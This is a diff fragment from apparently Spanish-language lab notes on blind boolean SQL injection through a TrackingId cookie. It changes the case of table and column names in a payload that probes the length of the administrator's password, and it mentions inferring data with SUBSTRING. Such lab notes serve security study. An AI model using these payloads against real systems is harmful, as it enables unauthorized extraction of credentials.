@@ -23,7 +23,7 @@ Cookie: TrackingId=xyz' AND '1'='2   --> no devuelve "Welcome back"
 
 2. Determinar la longitud aproximada probando `LENGTH`/`LEN` con booleanos o avanzando hasta obtener false cuando la posición excede la longitud.
  ```sql
-  ' AND (SELECT LENGTH(Password) FROM Users WHERE Username='Administrator') > 10 --
+  ' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 10 --
   ```
 
 Esto permite inferir bit a bit datos sensibles con funciones como `SUBSTRING`:
